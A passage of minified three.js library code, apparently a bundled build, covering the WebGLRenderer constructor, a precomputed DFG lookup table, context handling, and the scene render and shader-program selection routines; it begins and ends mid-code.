g(v){const x=v.target;x.removeEventListener("dispose",g);const S=a.indexOf(x.__bindingPointIndex);a.splice(S,1),t.deleteBuffer(s[x.id]),delete s[x.id],delete r[x.id]}function u(){for(const v in s)t.deleteBuffer(s[v]);a=[],s={},r={}}return{bind:l,update:c,dispose:u}}const wC=new Uint16Array([12469,15057,12620,14925,13266,14620,13807,14376,14323,13990,14545,13625,14713,13328,14840,12882,14931,12528,14996,12233,15039,11829,15066,11525,15080,11295,15085,10976,15082,10705,15073,10495,13880,14564,13898,14542,13977,14430,14158,14124,14393,13732,14556,13410,14702,12996,14814,12596,14891,12291,14937,11834,14957,11489,14958,11194,14943,10803,14921,10506,14893,10278,14858,9960,14484,14039,14487,14025,14499,13941,14524,13740,14574,13468,14654,13106,14743,12678,14818,12344,14867,11893,14889,11509,14893,11180,14881,10751,14852,10428,14812,10128,14765,9754,14712,9466,14764,13480,14764,13475,14766,13440,14766,13347,14769,13070,14786,12713,14816,12387,14844,11957,14860,11549,14868,11215,14855,10751,14825,10403,14782,10044,14729,9651,14666,9352,14599,9029,14967,12835,14966,12831,14963,12804,14954,12723,14936,12564,14917,12347,14900,11958,14886,11569,14878,11247,14859,10765,14828,10401,14784,10011,14727,9600,14660,9289,14586,8893,14508,8533,15111,12234,15110,12234,15104,12216,15092,12156,15067,12010,15028,11776,14981,11500,14942,11205,14902,10752,14861,10393,14812,9991,14752,9570,14682,9252,14603,8808,14519,8445,14431,8145,15209,11449,15208,11451,15202,11451,15190,11438,15163,11384,15117,11274,15055,10979,14994,10648,14932,10343,14871,9936,14803,9532,14729,9218,14645,8742,14556,8381,14461,8020,14365,7603,15273,10603,15272,10607,15267,10619,15256,10631,15231,10614,15182,10535,15118,10389,15042,10167,14963,9787,14883,9447,14800,9115,14710,8665,14615,8318,14514,7911,14411,7507,14279,7198,15314,9675,15313,9683,15309,9712,15298,9759,15277,9797,15229,9773,15166,9668,15084,9487,14995,9274,14898,8910,14800,8539,14697,8234,14590,7790,14479,7409,14367,7067,14178,6621,15337,8619,15337,8631,15333,8677,15325,8769,15305,8871,15264,8940,15202,8909,15119,8775,15022,8565,14916,8328,14804,8009,14688,7614,14569,7287,14448,6888,14321,6483,14088,6171,15350,7402,15350,7419,15347,7480,15340,7613,15322,7804,15287,7973,15229,8057,15148,8012,15046,7846,14933,7611,14810,7357,14682,7069,14552,6656,14421,6316,14251,5948,14007,5528,15356,5942,15356,5977,15353,6119,15348,6294,15332,6551,15302,6824,15249,7044,15171,7122,15070,7050,14949,6861,14818,6611,14679,6349,14538,6067,14398,5651,14189,5311,13935,4958,15359,4123,15359,4153,15356,4296,15353,4646,15338,5160,15311,5508,15263,5829,15188,6042,15088,6094,14966,6001,14826,5796,14678,5543,14527,5287,14377,4985,14133,4586,13869,4257,15360,1563,15360,1642,15358,2076,15354,2636,15341,3350,15317,4019,15273,4429,15203,4732,15105,4911,14981,4932,14836,4818,14679,4621,14517,4386,14359,4156,14083,3795,13808,3437,15360,122,15360,137,15358,285,15355,636,15344,1274,15322,2177,15281,2765,15215,3223,15120,3451,14995,3569,14846,3567,14681,3466,14511,3305,14344,3121,14037,2800,13753,2467,15360,0,15360,1,15359,21,15355,89,15346,253,15325,479,15287,796,15225,1148,15133,1492,15008,1749,14856,1882,14685,1886,14506,1783,14324,1608,13996,1398,13702,1183]);let ei=null;function MC(){return ei===null&&(ei=new pM(wC,16,16,Or,Ii),ei.name="DFG_LUT",ei.minFilter=qt,ei.magFilter=qt,ei.wrapS=Ti,ei.wrapT=Ti,ei.generateMipmaps=!1,ei.needsUpdate=!0),ei}class EC{constructor(e={}){const{canvas:n=Bw(),context:i=null,depth:s=!0,stencil:r=!1,alpha:a=!1,antialias:o=!1,premultipliedAlpha:l=!0,preserveDrawingBuffer:c=!1,powerPreference:h="default",failIfMajorPerformanceCaveat:d=!1,reversedDepthBuffer:p=!1,outputBufferType:f=_n}=e;this.isWebGLRenderer=!0;let y;if(i!==null){if(typeof WebGLRenderingContext<"u"&&i instanceof WebGLRenderingContext)throw new Error("THREE.WebGLRenderer: WebGL 1 is not supported since r163.");y=i.getContextAttributes().alpha}else y=a;const _=f,g=new Set([yp,vp,gp]),u=new Set([_n,di,Xa,qa,fp,mp]),v=new Uint32Array(4),x=new Int32Array(4);let S=null,E=null;const A=[],C=[];let L=null;this.domElement=n,this.debug={checkShaderErrors:!0,onShaderError:null},this.autoClear=!0,this.autoClearColor=!0,this.autoClearDepth=!0,this.autoClearStencil=!0,this.sortObjects=!0,this.clippingPlanes=[],this.localClippingEnabled=!1,this.toneMapping=li,this.toneMappingExposure=1,this.transmissionResolutionScale=1;const w=this;let M=!1;this._outputColorSpace=Rn;let k=0,H=0,V=null,W=-1,j=null;const X=new bt,D=new bt;let N=null;const O=new Xe(0);let B=0,J=n.width,oe=n.height,ge=1,ze=null,Ye=null;const Z=new bt(0,0,J,oe),ne=new bt(0,0,J,oe);let _e=!1;const De=new Mp;let we=!1,$e=!1;const Nt=new St,We=new G,et=new bt,at={background:null,fog:null,environment:null,overrideMaterial:null,isScene:!0};let Fe=!1;function Mt(){return V===null?ge:1}let P=i;function Et(T,F){return n.getContext(T,F)}try{const T={alpha:!0,depth:s,stencil:r,antialias:o,premultipliedAlpha:l,preserveDrawingBuffer:c,powerPreference:h,failIfMajorPerformanceCaveat:d};if("setAttribute"in n&&n.setAttribute("data-engine",`three.js r${hp}`),n.addEventListener("webglcontextlost",Ne,!1),n.addEventListener("webglcontextrestored",ct,!1),n.addEventListener("webglcontextcreationerror",tt,!1),P===null){const F="webgl2";if(P=Et(F,T),P===null)throw Et(F)?new Error("Error creating WebGL context with your selected attributes."):new Error("Error creating WebGL context.")}}catch(T){throw Ze("WebGLRenderer: "+T.message),T}let Qe,lt,Ee,R,b,U,Q,te,K,Ae,ce,Me,Pe,re,de,Se,Te,ue,Be,I,me,ae,ve,ie;function ee(){Qe=new MT(P),Qe.init(),ae=new mC(P,Qe),lt=new mT(P,Qe,e,ae),Ee=new pC(P,Qe),lt.reversedDepthBuffer&&p&&Ee.buffers.depth.setReversed(!0),R=new AT(P),b=new JA,U=new fC(P,Qe,Ee,b,lt,ae,R),Q=new vT(w),te=new wT(w),K=new LM(P),ve=new pT(P,K),Ae=new ET(P,K,R,ve),ce=new RT(P,Ae,K,R),Be=new CT(P,lt,U),Se=new gT(b),Me=new ZA(w,Q,te,Qe,lt,ve,Se),Pe=new bC(w,b),re=new eC,de=new aC(Qe),ue=new hT(w,Q,te,Ee,ce,y,l),Te=new dC(w,ce,lt),ie=new SC(P,R,lt,Ee),I=new fT(P,Qe,R),me=new TT(P,Qe,R),R.programs=Me.programs,w.capabilities=lt,w.extensions=Qe,w.properties=b,w.renderLists=re,w.shadowMap=Te,w.state=Ee,w.info=R}ee(),_!==_n&&(L=new LT(_,n.width,n.height,s,r));const le=new xC(w,P);this.xr=le,this.getContext=function(){return P},this.getContextAttributes=function(){return P.getContextAttributes()},this.forceContextLoss=function(){const T=Qe.get("WEBGL_lose_context");T&&T.loseContext()},this.forceContextRestore=function(){const T=Qe.get("WEBGL_lose_context");T&&T.restoreContext()},this.getPixelRatio=function(){return ge},this.setPixelRatio=function(T){T!==void 0&&(ge=T,this.setSize(J,oe,!1))},this.getSize=function(T){return T.set(J,oe)},this.setSize=function(T,F,Y=!0){if(le.isPresenting){Ie("WebGLRenderer: Can't change size while VR device is presenting.");return}J=T,oe=F,n.width=Math.floor(T*ge),n.height=Math.floor(F*ge),Y===!0&&(n.style.width=T+"px",n.style.height=F+"px"),L!==null&&L.setSize(n.width,n.height),this.setViewport(0,0,T,F)},this.getDrawingBufferSize=function(T){return T.set(J*ge,oe*ge).floor()},this.setDrawingBufferSize=function(T,F,Y){J=T,oe=F,ge=Y,n.width=Math.floor(T*Y),n.height=Math.floor(F*Y),this.setViewport(0,0,T,F)},this.setEffects=function(T){if(_===_n){console.error("THREE.WebGLRenderer: setEffects() requires outputBufferType set to HalfFloatType or FloatType.");return}if(T){for(let F=0;F<T.length;F++)if(T[F].isOutputPass===!0){console.warn("THREE.WebGLRenderer: OutputPass is not needed in setEffects(). Tone mapping and color space conversion are applied automatically.");break}}L.setEffects(T||[])},this.getCurrentViewport=function(T){return T.copy(X)},this.getViewport=function(T){return T.copy(Z)},this.setViewport=function(T,F,Y,q){T.isVector4?Z.set(T.x,T.y,T.z,T.w):Z.set(T,F,Y,q),Ee.viewport(X.copy(Z).multiplyScalar(ge).round())},this.getScissor=function(T){return T.copy(ne)},this.setScissor=function(T,F,Y,q){T.isVector4?ne.set(T.x,T.y,T.z,T.w):ne.set(T,F,Y,q),Ee.scissor(D.copy(ne).multiplyScalar(ge).round())},this.getScissorTest=function(){return _e},this.setScissorTest=function(T){Ee.setScissorTest(_e=T)},this.setOpaqueSort=function(T){ze=T},this.setTransparentSort=function(T){Ye=T},this.getClearColor=function(T){return T.copy(ue.getClearColor())},this.setClearColor=function(){ue.setClearColor(...arguments)},this.getClearAlpha=function(){return ue.getClearAlpha()},this.setClearAlpha=function(){ue.setClearAlpha(...arguments)},this.clear=function(T=!0,F=!0,Y=!0){let q=0;if(T){let z=!1;if(V!==null){const he=V.texture.format;z=g.has(he)}if(z){const he=V.texture.type,ye=u.has(he),fe=ue.getClearColor(),be=ue.getClearAlpha(),Ce=fe.r,Le=fe.g,Re=fe.b;ye?(v[0]=Ce,v[1]=Le,v[2]=Re,v[3]=be,P.clearBufferuiv(P.COLOR,0,v)):(x[0]=Ce,x[1]=Le,x[2]=Re,x[3]=be,P.clearBufferiv(P.COLOR,0,x))}else q|=P.COLOR_BUFFER_BIT}F&&(q|=P.DEPTH_BUFFER_BIT),Y&&(q|=P.STENCIL_BUFFER_BIT,this.state.buffers.stencil.setMask(4294967295)),P.clear(q)},this.clearColor=function(){this.clear(!0,!1,!1)},this.clearDepth=function(){this.clear(!1,!0,!1)},this.clearStencil=function(){this.clear(!1,!1,!0)},this.dispose=function(){n.removeEventListener("webglcontextlost",Ne,!1),n.removeEventListener("webglcontextrestored",ct,!1),n.removeEventListener("webglcontextcreationerror",tt,!1),ue.dispose(),re.dispose(),de.dispose(),b.dispose(),Q.dispose(),te.dispose(),ce.dispose(),ve.dispose(),ie.dispose(),Me.dispose(),le.dispose(),le.removeEventListener("sessionstart",Rp),le.removeEventListener("sessionend",kp),gs.stop()};function Ne(T){T.preventDefault(),vm("WebGLRenderer: Context Lost."),M=!0}function ct(){vm("WebGLRenderer: Context Restored."),M=!1;const T=R.autoReset,F=Te.enabled,Y=Te.autoUpdate,q=Te.needsUpdate,z=Te.type;ee(),R.autoReset=T,Te.enabled=F,Te.autoUpdate=Y,Te.needsUpdate=q,Te.type=z}function tt(T){Ze("WebGLRenderer: A WebGL context could not be created. Reason: ",T.statusMessage)}function Jn(T){const F=T.target;F.removeEventListener("dispose",Jn),fi(F)}function fi(T){_y(T),b.remove(T)}function _y(T){const F=b.get(T).programs;F!==void 0&&(F.forEach(function(Y){Me.releaseProgram(Y)}),T.isShaderMaterial&&Me.releaseShaderCache(T))}this.renderBufferDirect=function(T,F,Y,q,z,he){F===null&&(F=at);const ye=z.isMesh&&z.matrixWorld.determinant()<0,fe=Sy(T,F,Y,q,z);Ee.setMaterial(q,ye);let be=Y.index,Ce=1;if(q.wireframe===!0){if(be=Ae.getWireframeAttribute(Y),be===void 0)return;Ce=2}const Le=Y.drawRange,Re=Y.attributes.position;let Ve=Le.start*Ce,rt=(Le.start+Le.count)*Ce;he!==null&&(Ve=Math.max(Ve,he.start*Ce),rt=Math.min(rt,(he.start+he.count)*Ce)),be!==null?(Ve=Math.max(Ve,0),rt=Math.min(rt,be.count)):Re!=null&&(Ve=Math.max(Ve,0),rt=Math.min(rt,Re.count));const yt=rt-Ve;if(yt<0||yt===1/0)return;ve.setup(z,q,fe,Y,be);let xt,ot=I;if(be!==null&&(xt=K.get(be),ot=me,ot.setIndex(xt)),z.isMesh)q.wireframe===!0?(Ee.setLineWidth(q.wireframeLinewidth*Mt()),ot.setMode(P.LINES)):ot.setMode(P.TRIANGLES);else if(z.isLine){let ke=q.linewidth;ke===void 0&&(ke=1),Ee.setLineWidth(ke*Mt()),z.isLineSegments?ot.setMode(P.LINES):z.isLineLoop?ot.setMode(P.LINE_LOOP):ot.setMode(P.LINE_STRIP)}else z.isPoints?ot.setMode(P.POINTS):z.isSprite&&ot.setMode(P.TRIANGLES);if(z.isBatchedMesh)if(z._multiDrawInstances!==null)Ya("WebGLRenderer: renderMultiDrawInstances has been deprecated and will be removed in r184. Append to renderMultiDraw arguments and use indirection."),ot.renderMultiDrawInstances(z._multiDrawStarts,z._multiDrawCounts,z._multiDrawCount,z._multiDrawInstances);else if(Qe.get("WEBGL_multi_draw"))ot.renderMultiDraw(z._multiDrawStarts,z._multiDrawCounts,z._multiDrawCount);else{const ke=z._multiDrawStarts,nt=z._multiDrawCounts,Ke=z._multiDrawCount,fn=be?K.get(be).bytesPerElement:1,js=b.get(q).currentProgram.getUniforms();for(let mn=0;mn<Ke;mn++)js.setValue(P,"_gl_DrawID",mn),ot.render(ke[mn]/fn,nt[mn])}else if(z.isInstancedMesh)ot.renderInstances(Ve,yt,z.count);else if(Y.isInstancedBufferGeometry){const ke=Y._maxInstanceCount!==void 0?Y._maxInstanceCount:1/0,nt=Math.min(Y.instanceCount,ke);ot.renderInstances(Ve,yt,nt)}else ot.render(Ve,yt)};function Cp(T,F,Y){T.transparent===!0&&T.side===wi&&T.forceSinglePass===!1?(T.side=pn,T.needsUpdate=!0,co(T,F,Y),T.side=ds,T.needsUpdate=!0,co(T,F,Y),T.side=wi):co(T,F,Y)}this.compile=function(T,F,Y=null){Y===null&&(Y=T),E=de.get(Y),E.init(F),C.push(E),Y.traverseVisible(function(z){z.isLight&&z.layers.test(F.layers)&&(E.pushLight(z),z.castShadow&&E.pushShadow(z))}),T!==Y&&T.traverseVisible(function(z){z.isLight&&z.layers.test(F.layers)&&(E.pushLight(z),z.castShadow&&E.pushShadow(z))}),E.setupLights();const q=new Set;return T.traverse(function(z){if(!(z.isMesh||z.isPoints||z.isLine||z.isSprite))return;const he=z.material;if(he)if(Array.isArray(he))for(let ye=0;ye<he.length;ye++){const fe=he[ye];Cp(fe,Y,z),q.add(fe)}else Cp(he,Y,z),q.add(he)}),E=C.pop(),q},this.compileAsync=function(T,F,Y=null){const q=this.compile(T,F,Y);return new Promise(z=>{function he(){if(q.forEach(function(ye){b.get(ye).currentProgram.isReady()&&q.delete(ye)}),q.size===0){z(T);return}setTimeout(he,10)}Qe.get("KHR_parallel_shader_compile")!==null?he():setTimeout(he,10)})};let uc=null;function by(T){uc&&uc(T)}function Rp(){gs.stop()}function kp(){gs.start()}const gs=new my;gs.setAnimationLoop(by),typeof self<"u"&&gs.setContext(self),this.setAnimationLoop=function(T){uc=T,le.setAnimationLoop(T),T===null?gs.stop():gs.start()},le.addEventListener("sessionstart",Rp),le.addEventListener("sessionend",kp),this.render=function(T,F){if(F!==void 0&&F.isCamera!==!0){Ze("WebGLRenderer.render: camera is not an instance of THREE.Camera.");return}if(M===!0)return;const Y=le.enabled===!0&&le.isPresenting===!0,q=L!==null&&(V===null||Y)&&L.begin(w,V);if(T.matrixWorldAutoUpdate===!0&&T.updateMatrixWorld(),F.parent===null&&F.matrixWorldAutoUpdate===!0&&F.updateMatrixWorld(),le.enabled===!0&&le.isPresenting===!0&&(L===null||L.isCompositing()===!1)&&(le.cameraAutoUpdate===!0&&le.updateCamera(F),F=le.getCamera()),T.isScene===!0&&T.onBeforeRender(w,T,F,V),E=de.get(T,C.length),E.init(F),C.push(E),Nt.multiplyMatrices(F.projectionMatrix,F.matrixWorldInverse),De.setFromProjectionMatrix(Nt,ri,F.reversedDepth),$e=this.localClippingEnabled,we=Se.init(this.clippingPlanes,$e),S=re.get(T,A.length),S.init(),A.push(S),le.enabled===!0&&le.isPresenting===!0){const ye=w.xr.getDepthSensingMesh();ye!==null&&dc(ye,F,-1/0,w.sortObjects)}dc(T,F,0,w.sortObjects),S.finish(),w.sortObjects===!0&&S.sort(ze,Ye),Fe=le.enabled===!1||le.isPresenting===!1||le.hasDepthSensing()===!1,Fe&&ue.addToRenderList(S,T),this.info.render.frame++,we===!0&&Se.beginShadows();const z=E.state.shadowsArray;if(Te.render(z,T,F),we===!0&&Se.endShadows(),this.info.autoReset===!0&&this.info.reset(),(q&&L.hasRenderPass())===!1){const ye=S.opaque,fe=S.transmissive;if(E.setupLights(),F.isArrayCamera){const be=F.cameras;if(fe.length>0)for(let Ce=0,Le=be.length;Ce<Le;Ce++){const Re=be[Ce];Pp(ye,fe,T,Re)}Fe&&ue.render(T);for(let Ce=0,Le=be.length;Ce<Le;Ce++){const Re=be[Ce];Lp(S,T,Re,Re.viewport)}}else fe.length>0&&Pp(ye,fe,T,F),Fe&&ue.render(T),Lp(S,T,F)}V!==null&&H===0&&(U.updateMultisampleRenderTarget(V),U.updateRenderTargetMipmap(V)),q&&L.end(w),T.isScene===!0&&T.onAfterRender(w,T,F),ve.resetDefaultState(),W=-1,j=null,C.pop(),C.length>0?(E=C[C.length-1],we===!0&&Se.setGlobalState(w.clippingPlanes,E.state.camera)):E=null,A.pop(),A.length>0?S=A[A.length-1]:S=null};function dc(T,F,Y,q){if(T.visible===!1)return;if(T.layers.test(F.layers)){if(T.isGroup)Y=T.renderOrder;else if(T.isLOD)T.autoUpdate===!0&&T.update(F);else if(T.isLight)E.pushLight(T),T.castShadow&&E.pushShadow(T);else if(T.isSprite){if(!T.frustumCulled||De.intersectsSprite(T)){q&&et.setFromMatrixPosition(T.matrixWorld).applyMatrix4(Nt);const ye=ce.update(T),fe=T.material;fe.visible&&S.push(T,ye,fe,Y,et.z,null)}}else if((T.isMesh||T.isLine||T.isPoints)&&(!T.frustumCulled||De.intersectsObject(T))){const ye=ce.update(T),fe=T.material;if(q&&(T.boundingSphere!==void 0?(T.boundingSphere===null&&T.computeBoundingSphere(),et.copy(T.boundingSphere.center)):(ye.boundingSphere===null&&ye.computeBoundingSphere(),et.copy(ye.boundingSphere.center)),et.applyMatrix4(T.matrixWorld).applyMatrix4(Nt)),Array.isArray(fe)){const be=ye.groups;for(let Ce=0,Le=be.length;Ce<Le;Ce++){const Re=be[Ce],Ve=fe[Re.materialIndex];Ve&&Ve.visible&&S.push(T,ye,Ve,Y,et.z,Re)}}else fe.visible&&S.push(T,ye,fe,Y,et.z,null)}}const he=T.children;for(let ye=0,fe=he.length;ye<fe;ye++)dc(he[ye],F,Y,q)}function Lp(T,F,Y,q){const{opaque:z,transmissive:he,transparent:ye}=T;E.setupLightsView(Y),we===!0&&Se.setGlobalState(w.clippingPlanes,Y),q&&Ee.viewport(X.copy(q)),z.length>0&&lo(z,F,Y),he.length>0&&lo(he,F,Y),ye.length>0&&lo(ye,F,Y),Ee.buffers.depth.setTest(!0),Ee.buffers.depth.setMask(!0),Ee.buffers.color.setMask(!0),Ee.setPolygonOffset(!1)}function Pp(T,F,Y,q){if((Y.isScene===!0?Y.overrideMaterial:null)!==null)return;if(E.state.transmissionRenderTarget[q.id]===void 0){const Ve=Qe.has("EXT_color_buffer_half_float")||Qe.has("EXT_color_buffer_float");E.state.transmissionRenderTarget[q.id]=new ci(1,1,{generateMipmaps:!0,type:Ve?Ii:_n,minFilter:Ps,samples:lt.samples,stencilBuffer:r,resolveDepthBuffer:!1,resolveStencilBuffer:!1,colorSpace:je.workingColorSpace})}const he=E.state.transmissionRenderTarget[q.id],ye=q.viewport||X;he.setSize(ye.z*w.transmissionResolutionScale,ye.w*w.transmissionResolutionScale);const fe=w.getRenderTarget(),be=w.getActiveCubeFace(),Ce=w.getActiveMipmapLevel();w.setRenderTarget(he),w.getClearColor(O),B=w.getClearAlpha(),B<1&&w.setClearColor(16777215,.5),w.clear(),Fe&&ue.render(Y);const Le=w.toneMapping;w.toneMapping=li;const Re=q.viewport;if(q.viewport!==void 0&&(q.viewport=void 0),E.setupLightsView(q),we===!0&&Se.setGlobalState(w.clippingPlanes,q),lo(T,Y,q),U.updateMultisampleRenderTarget(he),U.updateRenderTargetMipmap(he),Qe.has("WEBGL_multisampled_render_to_texture")===!1){let Ve=!1;for(let rt=0,yt=F.length;rt<yt;rt++){const xt=F[rt],{object:ot,geometry:ke,material:nt,group:Ke}=xt;if(nt.side===wi&&ot.layers.test(q.layers)){const fn=nt.side;nt.side=pn,nt.needsUpdate=!0,Np(ot,Y,q,ke,nt,Ke),nt.side=fn,nt.needsUpdate=!0,Ve=!0}}Ve===!0&&(U.updateMultisampleRenderTarget(he),U.updateRenderTargetMipmap(he))}w.setRenderTarget(fe,be,Ce),w.setClearColor(O,B),Re!==void 0&&(q.viewport=Re),w.toneMapping=Le}function lo(T,F,Y){const q=F.isScene===!0?F.overrideMaterial:null;for(let z=0,he=T.length;z<he;z++){const ye=T[z],{object:fe,geometry:be,group:Ce}=ye;let Le=ye.material;Le.allowOverride===!0&&q!==null&&(Le=q),fe.layers.test(Y.layers)&&Np(fe,F,Y,be,Le,Ce)}}function Np(T,F,Y,q,z,he){T.onBeforeRender(w,F,Y,q,z,he),T.modelViewMatrix.multiplyMatrices(Y.matrixWorldInverse,T.matrixWorld),T.normalMatrix.getNormalMatrix(T.modelViewMatrix),z.onBeforeRender(w,F,Y,q,T,he),z.transparent===!0&&z.side===wi&&z.forceSinglePass===!1?(z.side=pn,z.needsUpdate=!0,w.renderBufferDirect(Y,F,q,z,T,he),z.side=ds,z.needsUpdate=!0,w.renderBufferDirect(Y,F,q,z,T,he),z.side=wi):w.renderBufferDirect(Y,F,q,z,T,he),T.onAfterRender(w,F,Y,q,z,he)}function co(T,F,Y){F.isScene!==!0&&(F=at);const q=b.get(T),z=E.state.lights,he=E.state.shadowsArray,ye=z.state.version,fe=Me.getParameters(T,z.state,he,F,Y),be=Me.getProgramCacheKey(fe);let Ce=q.programs;q.environment=T.isMeshStandardMaterial?F.environment:null,q.fog=F.fog,q.envMap=(T.isMeshStandardMaterial?te:Q).get(T.envMap||q.environment),q.envMapRotation=q.environment!==null&&T.envMap===null?F.environmentRotation:T.envMapRotation,Ce===void 0&&(T.addEventListener("dispose",Jn),Ce=new Map,q.programs=Ce);let Le=Ce.get(be);if(Le!==void 0){if(q.currentProgram===Le&&q.lightsStateVersion===ye)return Dp(T,fe),Le}else fe.uniforms=Me.getUniforms(T),T.onBeforeCompile(fe,w),Le=Me.acquireProgram(fe,be),Ce.set(be,Le),q.uniforms=fe.uniforms;const Re=q.uniforms;return(!T.isShaderMaterial&&!T.isRawShaderMaterial||T.clipping===!0)&&(Re.clippingPlanes=Se.uniform),Dp(T,fe),q.needsLights=My(T),q.lightsStateVersion=ye,q.needsLights&&(Re.ambientLightColor.value=z.state.ambient,Re.lightProbe.value=z.state.probe,Re.directionalLights.value=z.state.directional,Re.directionalLightShadows.value=z.state.directionalShadow,Re.spotLights.value=z.state.spot,Re.spotLightShadows.value=z.state.spotShadow,Re.rectAreaLights.value=z.state.rectArea,Re.ltc_1.value=z.state.rectAreaLTC1,Re.ltc_2.value=z.state.rectAreaLTC2,Re.pointLights.value=z.state.point,Re.pointLightShadows.value=z.state.pointShadow,Re.hemisphereLights.value=z.state.hemi,Re.directionalShadowMap.value=z.state.directionalShadowMap,Re.directionalShadowMatrix.value=z.state.directionalShadowMatrix,Re.spotShadowMap.value=z.state.spotShadowMap,Re.spotLightMatrix.value=z.state.spotLightMatrix,Re.spotLightMap.value=z.state.spotLightMap,Re.pointShadowMap.value=z.state.pointShadowMap,Re.pointShadowMatrix.value=z.state.pointShadowMatrix),q.currentProgram=Le,q.uniformsList=null,Le}function Ip(T){if(T.uniformsList===null){const F=T.currentProgram.getUniforms();T.uniformsList=pl.seqWithValue(F.seq,T.uniforms)}return T.uniformsList}function Dp(T,F){const Y=b.get(T);Y.outputColorSpace=F.outputColorSpace,Y.batching=F.batching,Y.batchingColor=F.batchingColor,Y.instancing=F.instancing,Y.instancingColor=F.instancingColor,Y.instancingMorph=F.instancingMorph,Y.skinning=F.skinning,Y.morphTargets=F.morphTargets,Y.morphNormals=F.morphNormals,Y.morphColors=F.morphColors,Y.morphTargetsCount=F.morphTargetsCount,Y.numClippingPlanes=F.numClippingPlanes,Y.numIntersection=F.numClipIntersection,Y.vertexAlphas=F.vertexAlphas,Y.vertexTangents=F.vertexTangents,Y.toneMapping=F.toneMapping}function Sy(T,F,Y,q,z){F.isScene!==!0&&(F=at),U.resetTextureUnits();const he=F.fog,ye=q.isMeshStandardMaterial?F.environment:null,fe=V===null?w.outputColorSpace:V.isXRRenderTarget===!0?V.texture.colorSpace:Fr,be=(q.isMeshStandardMaterial?te:Q).get(q.envMap||ye),Ce=q.vertexColors===!0&&!!Y.attributes.color&&Y.attributes.color.itemSize===4,Le=!!Y.attributes.tangent&&(!!q.normalMap||q.anisotropy>0),Re=!!Y.morphAttributes.position,Ve=!!Y.morphAttributes.normal,rt=!!Y.morphAttributes.color;let yt=li;q.toneMapped&&(V===null||V.isXRRenderTarget===!0)&&(yt=w.toneMapping);const xt=Y.morphAttributes.position||Y.morphAttributes.normal||Y.morphAttributes.color,ot=xt!==void 0?xt.length:0,ke=b.get(q),nt=E.state.lights;if(we===!0&&($e===!0||T!==j)){const Zt=T===j&&q.id===W;Se.setState(q,T,Zt)}let Ke=!1;q.version===ke.__version?(ke.needsLights&&ke.lightsStateVersion!==nt.state.version||ke.outputColorSpace!==fe||z.isBatchedMesh&&ke.batching===!1||!z.isBatchedMesh&&ke.batching===!0||z.isBatchedMesh&&ke.batchingColor===!0&&z.colorTexture===null||z.isBatchedMesh&&ke.batchingColor===!1&&z.colorTexture!==null||z.isInstancedMesh&&ke.instancing===!1||!z.isInstancedMesh&&ke.instancing===!0||z.isSkinnedMesh&&ke.skinning===!1||!z.isSkinnedMesh&&ke.skinning===!0||z.isInstancedMesh&&ke.instancingColor===!0&&z.instanceColor===null||z.isInstancedMesh&&ke.instancingColor===!1&&z.instanceColor!==null||z.isInstancedMesh&&ke.instancingMorph===!0&&z.morphTexture===null||z.isInstancedMesh&&ke.instancingMorph===!1&&z.morphTexture!==null||ke.envMap!==be||q.fog===!0&&ke.fog!==he||ke.numClippingPlanes!==void 0&&(ke.numClippingPlanes!==Se.numPlanes||ke.numIntersection!==Se.numIntersection)||ke.vertexAlphas!==Ce||ke.vertexTangents!==Le||ke.morphTargets!==Re||ke.morphNormals!==Ve||ke.morphColors!==rt||ke.toneMapping!==yt||ke.morphTargetsCount!==ot)&&(Ke=!0):(Ke=!0,ke.__version=q.version);let fn=ke.currentProgram;Ke===!0&&(fn=co(q,F,z));let js=!1,mn=!1,Xr=!1;const ut=fn.getUniforms(),rn=ke.uniforms;if(Ee.useProgram(fn.program)&&(js=!0,mn=!0,Xr=!0),q.id!==W&&(W=q.id,mn=!0),js||j!==T){Ee.buffers.depth.getReversed()&&T.reversedDepth!==!0&&(T._reversedDepth=!0,T.updateProjectionMatrix()),ut.setValue(P,"projectionMatrix",T.projectionMatrix),ut.setValue(P,"viewMatrix",T.matrixWorldInverse);const an=ut.map.cameraPosition;an!==void 0&&an.setValue(P,We.setFromMatrixPosition(T.matrixWorld)),lt.logarithmicDepthBuffer&&ut.setValue(P,"logDepthBufFC",2/(Math.log(T.far+1)/Math.LN2)),(q.isMeshPhongMaterial||q.isMeshToonMaterial||q.isMeshLambertMaterial||q.isMeshBasicMaterial||q.isMeshStandardMaterial||q.isShaderMaterial)&&ut.setValue(P,"isOrthographic",T.isOrthographicCamera===!0),j!==T&&(j=T,mn=!0,Xr=!0)}if(ke.needsLights&&(nt.state.directionalShadowMap.length>0&&ut.setValue(P,"directionalShadowMap",nt.state.directionalShadowMap,U),nt.state.spotShadowMap.length>0&&ut.setValue(P,"spotShadowMap",nt.state.spotShadowMap,U),nt.state.pointShadowMap.length>0&&ut.setValue(P,"pointShadowMap",nt.state.pointShadowMap,U)),z.isSkinnedMesh){ut.setOptional(P,z,"bindMatrix"),ut.setOptional(P,z,"bindMatrixInverse");const Zt=z.skeleton;Zt&&(Zt.boneTexture===null&&Zt.computeBoneTexture(),ut.setValue(P,"boneTexture",Zt.boneTexture,U))}z.isBatchedMesh&&(ut.setOptional(P,z,"batchingTexture"),ut.setValue(P,"batchingTexture",z._matricesTexture,U),ut.setOptional(P,z,"batchingIdTexture"),ut.setValue(P,"batchingIdTexture",z._indirectTexture,U),ut.setOptional(P,z,"batchingColorTexture"),z._colorsTexture!==null&&ut.setValue(P,"batchingColorTexture",z._colorsTexture,U));const Tn=Y.morphAttributes;if((Tn.position!==void 0||Tn.normal!==void 0||Tn.color!==void 0)&&Be.update(z,Y,fn),(mn||ke.receiveShadow!==z.receiveShadow)&&(ke.receiveShadow=z.receiveShadow,ut.setValue(P,"receiveShadow",z.receiveShadow)),q.isMeshGouraudMaterial&&q.envMap!==null&&(rn.envMap.value=be,rn.flipEnvMap.value=be.isCubeTexture&&be.isRenderTargetTexture===!1?-1:1),q.isMeshStandardMaterial&&q.envMap===null&&F.environment!==null&&(rn.envMapIntensity.value=F.environmentIntensity),rn.dfgLUT!==void 